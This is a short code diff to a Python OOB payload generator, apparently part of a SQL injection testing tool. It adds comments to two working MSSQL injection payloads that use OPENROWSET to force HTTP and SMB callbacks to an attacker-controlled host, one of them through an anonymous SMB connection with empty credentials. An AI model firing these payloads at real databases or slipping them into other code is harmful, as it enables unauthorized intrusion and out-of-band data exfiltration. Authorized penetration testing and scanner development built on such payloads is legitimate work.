@@ -92,6 +92,8 @@ class OOBPayloadGenerator:
         payloads = []
         
         # OpenRowSet HTTP exfiltration
+        # Note: 'uid=sa;pwd=pass' are placeholder credentials that don't affect the OOB callback
+        # The connection attempt itself triggers the HTTP request, regardless of authentication
         http_payload = f"""' UNION SELECT 1,2,3 FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=http://{self.attacker_host}:{self.attacker_port};uid=sa;pwd=pass','SELECT 1')--"""
         
         payloads.append(OOBPayload(
@@ -118,6 +120,8 @@ class OOBPayloadGenerator:
         ))
         
         # OpenRowSet SMB exfiltration
+        # Note: Empty credentials (uid=;pwd=) are intentional for SMB NULL sessions or anonymous connections
+        # This allows the OOB callback to occur without requiring valid credentials
         smb_payload = f"""' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=\\\\{self.attacker_host}\\share;uid=;pwd=','SELECT 1')--"""
         
         payloads.append(OOBPayload(
